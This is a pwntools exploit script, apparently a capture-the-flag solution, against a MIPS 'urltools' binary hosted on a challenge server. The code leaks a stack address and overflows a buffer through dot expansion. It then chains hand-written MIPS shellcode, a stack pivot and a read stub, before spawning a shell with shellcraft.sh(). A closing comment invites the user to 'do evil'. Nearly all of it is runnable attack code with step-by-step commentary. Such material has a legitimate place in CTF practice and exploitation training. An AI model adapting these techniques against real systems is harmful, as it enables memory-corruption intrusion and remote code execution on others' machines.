from pwn import *

def sanitize_url(data):
    io.sendline(b'1')
    io.sendline(data)
    io.recvuntil(b'>> ')
    io.recvuntil(b'>> ')
    

context(arch='mips',endian='little',bits=32)

#remote
io = remote('chal.competitivecyber.club', 5001)

#local
#io = process(['qemu-mipsel-static', '-L', '.', './urltools'])

#local_debug
#io = gdb.debug(args=['-L', '.', './urltools'], exe='./urltools', env={},  gdbscript='''
#               break *0x2b2abd88
#
#               continue
#        ''')




# Phase 1: Leak Stack Addr

# We need to run sanitize with empty string, so the buffer is initialized properly
sanitize_url(b'')

# We now run detect_tld. Since there is no '.' in our buffer, 
# it'll prompt us for a new one, this ends up lettting us print
# past buffer and leaks and address on the stack
io.sendline(b'2')
io.sendline(b'D'*35)
io.recvuntil(b'Your TLD is ')

# Parse the leaked stack addr from the output
addr = io.recvline().rstrip()
stack_addr = u32(addr[0:4])

print('Stack addr: ' + hex(stack_addr))

io.recvuntil(b'>> ')

# Phase 2: Buffer Overflow

# Create Payload; Even though we can only input 40 characters,
# the '.' character gets expanded to '[.]'. This allows us to
# us to create an input thats longer than expected, allowing us
# to overflow the buffer and overwrite the return address to main
# Now if we run the "Quit" command, we can return to the stack,
# however there is still more preparation to be done

payload = b'.'*0x1d
payload += b'A'*1
payload += p32(stack_addr)

# Send payload
sanitize_url(payload)

# We run this to clear the buffer to ensure our original buffer overflow
# doesn't cause issues with future shellcode
sanitize_url(b'A'*40)

# Phase 3: Custom shellcode payload

# When we return from main, we'll end up pretty close to the
# end of our buffer. This leaves us little space to put shellcode,
# so we need to move the stack pointer back to the beginning of
# buffer, and then jump again.In order to do this, we'll use an addi 
# instruction to add a negative number to the stack, and then call a 
#'jr $sp' instruction to jump to the new stack location. 

jumpback_shellcode = '''
    addi $sp, $sp, -0x5c
    jr $sp
    '''


# The problem is, `jr $sp` disassembles to 08 00 a0 03, which contains 
# a null byte. This causes fgets to truncate our shellcode and so the last
# two bytes a0 03 will not end up in the shellcode. In order to get around this, 
# we'll send a payload that contains a0 03 in the right place, such that
# when we send our real payload the bytes will line  up correctly to form
# the 'jr $sp' instruction we need

payload2 = b'E' * 34
payload2 += b'\xa0\x03'

sanitize_url(payload2) # send payload

#shellcode = shellcraft.read(0,p32(stack_addr),300)

# Now that we've moved our $pc back to the beginning of our buffer, we'll have more space
# for a bigger payload. This next payload will call read from stdin, with size of 300 bytes
# This asm stub was pulled from "shellcraft.read(0,p32(stack_addr),300)", but the payload
# generated from that was too large. Since we want to just put the data on the stack, we
# can thin out the shellcraft payload by just moving the stack address to $a1 register.
read_shellcode = '''
    add $a1, $sp, $0
    slti $a0, $zero, 0xFFFF
    ori $a2, $zero, 300
    ori $v0, $zero, SYS_read
    syscall 0x40404
    '''

# Let's put everything together to create our payload. The beginning of our buffer
# will contain our larger shellcode, that's meant to read the buffer. This is where
# we want to jump to. Then we add some buffer characters, so that we can place the 
# jump back shellcode, right at the stack address we leaked. Finally, we place our
# jump back shellcode, which will move the stack back 0x5c bytes, then jump to $sp
payload3 = asm(read_shellcode)
payload3 += b'D' * (cyclic_find(b'haaa') - len(payload3))
payload3 += asm(jumpback_shellcode)

# Send payload off
sanitize_url(payload3)

# Return from main. When main returns, we'll end up at our stack address
io.recvuntil(b'>> ')
io.sendline(b'3')

# Phase 4: Execute shell

# If we did everything right, the program should now be waiting for more input.
# This input size is based on what we set, in this case 300 bytes. This should
# be plenty of space for shellcode that will give us a shell. Our input will be
# placed directly on the stack, right where $sp is. Since $pc has moved past
# where $sp original was, we need to add some buffer characters so that once our
# read syscall returns, the instruction immediately after is our shellcraft shelllcode.
# This time we don't need to write custom shellcode, we have plenty of space to just
# use stock shellcraft.sh()
payload4 = b'G' * cyclic_find(b'faaa')
payload4 += asm(shellcraft.sh())

# Send out payload
io.sendline(payload4)


# Phase 5: Do evil 

# Should have a shell. Do what you want
io.interactive()



